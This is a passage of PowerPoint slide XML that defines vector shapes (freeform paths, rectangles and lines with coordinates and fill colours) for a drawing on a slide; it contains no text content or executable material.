                  <a:pt x="18" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="15"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="333333"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="697" name="CustomShape 313"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3576600" y="3743280"/>
            <a:ext cx="207360" cy="69120"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="131" h="44">
                <a:moveTo>
                  <a:pt x="54" y="43"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="56" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="57" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="59" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="60" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="63" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="65" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="67" y="37"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="71" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="75" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="78" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="80" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="81" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="84" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85" y="23"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="131" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="126" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="88" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="88" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="87" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="86" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="82" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="80" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="78" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="75" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="72" y="37"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="70" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="65" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="57" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="54" y="43"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="698" name="CustomShape 314"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3532320" y="3762360"/>
            <a:ext cx="213480" cy="61200"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="135" h="39">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="131" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="135" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="699" name="CustomShape 315"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3568680" y="3753000"/>
            <a:ext cx="208800" cy="56520"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="132" h="36">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="129" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="132" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="700" name="CustomShape 316"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3551400" y="3755880"/>
            <a:ext cx="210240" cy="61200"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="133" h="39">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="131" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="133" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="701" name="Line 317"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4086000" y="4249440"/>
            <a:ext cx="434880" cy="1800"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="11160">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="702" name="CustomShape 318"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4697280" y="3956040"/>
            <a:ext cx="321480" cy="162720"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="203" h="103">
                <a:moveTo>
                  <a:pt x="78" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="103"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="125" y="103"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="203" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="78" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="33cccc"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="703" name="CustomShape 319"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4859280" y="3416400"/>
            <a:ext cx="148680" cy="543960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="33cccc"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="704" name="CustomShape 320"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4700520" y="3570120"/>
            <a:ext cx="200880" cy="543960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="33cccc"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="705" name="CustomShape 321"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4700520" y="3570120"/>
            <a:ext cx="200880" cy="543960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="11160">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:miter/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="706" name="CustomShape 322"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4697280" y="3411360"/>
            <a:ext cx="321480" cy="164520"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="203" h="104">
                <a:moveTo>
                  <a:pt x="78" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="125" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="203" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="78" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="33cccc"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="707" name="CustomShape 323"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4697280" y="3411360"/>
            <a:ext cx="321480" cy="164520"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="203" h="104">
                <a:moveTo>
                  <a:pt x="78" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="125" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="203" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="78" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="11160">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="708" name="Line 324"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5019480" y="3422520"/>
            <a:ext cx="1440" cy="533520"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="11160">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="709" name="Line 325"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="4902120" y="3956040"/>
            <a:ext cx="117360" cy="158760"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="11160">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="710" name="CustomShape 326"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4724280" y="3641760"/>
            <a:ext cx="134280" cy="313560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3333cc"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="711" name="CustomShape 327"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4724280" y="3641760"/>
            <a:ext cx="134280" cy="313560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="11160">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:miter/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="712" name="CustomShape 328"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4745160" y="3736800"/>
            <a:ext cx="100800" cy="108720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="ffffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="713" name="CustomShape 329"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5641920" y="3625920"/>
            <a:ext cx="1901160" cy="1140840"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="1198" h="719">
                <a:moveTo>
                  <a:pt x="1160" y="13"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1154" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1149" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1142" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1137" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1130" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1123" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1116" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1107" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1099" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1091" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1082" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1074" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1064" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1055" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1036" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1016" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="997" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="977" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="956" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="936" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="925" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="915" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="904" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="895" y="75"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="885" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="875" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="866" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="855" y="79"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="837" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="817" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="798" y="75"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="778" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="758" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="739" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="719" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="698" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="677" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="655" y="58"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="632" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="610" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="599" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="586" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="574" y="58"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="562" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="550" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="537" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="524" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="510" y="68"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="495" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="480" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="464" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="448" y="79"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="432" y="82"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="415" y="86"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="398" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="380" y="93"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="345" y="100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="310" y="108"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="274" y="117"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="240" y="128"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="223" y="132"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="206" y="138"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="190" y="144"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="175" y="150"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="159" y="156"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="145" y="163"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="131" y="169"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="117" y="176"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="104" y="183"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="92" y="191"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="82" y="198"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="71" y="206"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="62" y="214"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="54" y="222"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="47" y="232"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40" y="241"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="250"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="262"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="23" y="273"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="284"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="297"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="310"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="323"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="336"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="350"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="364"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="378"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="391"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="406"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="420"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="434"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="448"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="461"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="475"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="489"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="502"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="514"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="526"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="539"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21" y="551"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="561"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="572"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="33" y="582"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="590"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="42" y="600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="47" y="607"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="51" y="615"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="57" y="621"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="63" y="627"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="70" y="632"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="77" y="638"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85" y="643"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="92" y="648"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="101" y="651"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="110" y="656"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="119" y="659"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="128" y="662"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="138" y="665"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="159" y="670"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="180" y="673"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="202" y="677"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="225" y="680"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="248" y="683"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="272" y="685"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="295" y="686"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="319" y="689"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="342" y="692"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="365" y="696"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="377" y="697"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="389" y="698"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="401" y="700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="413" y="701"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="439" y="704"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="466" y="707"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="492" y="710"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="520" y="711"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="576" y="714"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="604" y="715"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="631" y="717"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="658" y="718"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="684" y="719"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="695" y="719"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="708" y="719"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="720" y="719"/>
                </a:lnTo>
